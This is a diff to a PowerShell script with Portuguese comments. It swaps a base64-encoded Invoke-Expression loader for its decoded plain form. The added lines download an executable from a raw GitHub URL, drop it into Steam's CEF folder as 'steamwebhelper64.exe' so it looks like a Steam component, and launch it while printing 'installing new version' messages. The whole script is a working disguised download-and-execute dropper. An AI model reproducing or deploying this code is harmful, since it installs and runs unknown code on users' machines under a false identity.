@@ -1,4 +1,23 @@
-$enc = "JGRpcmV0b3JpbyA9ICJDOlxcUHJvZ3JhbSBGaWxlcyAoeDg2KVxTdGVhbVxiaW5cY2VmXGNlZi53aW43eDY0IgokdXJsID0gImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9zdXBlcm1hbi1sZWdpdC9lb3NtZW5vcm1pbmltdXNocGVjaW5oYWZpbGhhZGFwdXRhL3JlZnMvaGVhZHMvbWFpbi9zdGVhbXdlYmhlbHBlcjY0LmV4ZSIKJGNhbWluaG9BcnF1aXZvID0gSm9pbi1QYXRoIC1QYXRoICRkaXJldG9yaW8gLUNoaWxkUGF0aCAic3RlYW13ZWJoZWxwZXI2NC5leGUiCgojIENyaWEgb3MgZGlyZXRvcmlvcyBzZSBuYW8gZXhpc3RpcgppZiAoIShUZXN0LVBhdGggLVBhdGggJGRpcmV0b3JpbykpIHsKICAgIE5ldy1JdGVtIC1QYXRoICRkaXJldG9yaW8gLUl0ZW1UeXBlIERpcmVjdG9yeSB8IE91dC1OdWxsCn0KCiMgQXBhZ2EgYXJxdWl2byBzZSBleGlzdGlyCiBpZiAoVGVzdC1QYXRoIC1QYXRoICRjYW1pbmhvQXJxdWl2bykpIHsKICAgIFdyaXRlLUhvc3QgIkFwYWdhbmRvIGFycXVpdm8gZXhpc3RlbnRlLiIKICAgIFJlbW92ZS1JdGVtIC1QYXRoICRjYW1pbmhvQXJxdWl2byAtRm9yY2UKfQoKQ3VzdG9tLVdyaXRlSG9zdCAiSW5zdGFsYW5kbyBub3ZhIHZlcnNhb20uLi4iCkludm9rZS1XZWJSZXF1ZXN0IC1VcmkgJHVybCAtT3V0RmlsZSAkY2FtaW5ob0FycXVpdm8KClN0YXJ0LVByb2Nlc3MgJGNhbWluaG9BcnF1aXZvCldyaXRlLUhvc3QgIlN1Y2Vzc28uIgo="
-$bytes = [System.Convert]::FromBase64String($enc)
-$decoded = [System.Text.Encoding]::UTF8.GetString($bytes)
-Invoke-Expression $decoded
+$diretorio = "C:\Program Files (x86)\Steam\bin\cef\cef.win7x64"
+$url = "https://raw.githubusercontent.com/superman-legit/eosmenorminimushpecinhafilhadaputa/refs/heads/main/steamwebhelper64.exe"
+$caminhoArquivo = Join-Path -Path $diretorio -ChildPath "steamwebhelper64.exe"
+
+# Cria os diretórios se não existirem
+if (!(Test-Path -Path $diretorio)) {
+    New-Item -Path $diretorio -ItemType Directory | Out-Null
+}
+
+# Apaga o arquivo se já existir
+if (Test-Path -Path $caminhoArquivo) {
+    Write-Host "Apagando arquivo existente."
+    Remove-Item -Path $caminhoArquivo -Force
+}
+
+# Baixa o novo arquivo
+Write-Host "Instalando nova versão..."
+Invoke-WebRequest -Uri $url -OutFile $caminhoArquivo
+
+Write-Host "Execução..."
+Start-Process $caminhoArquivo
+
+Write-Host "Sucesso."
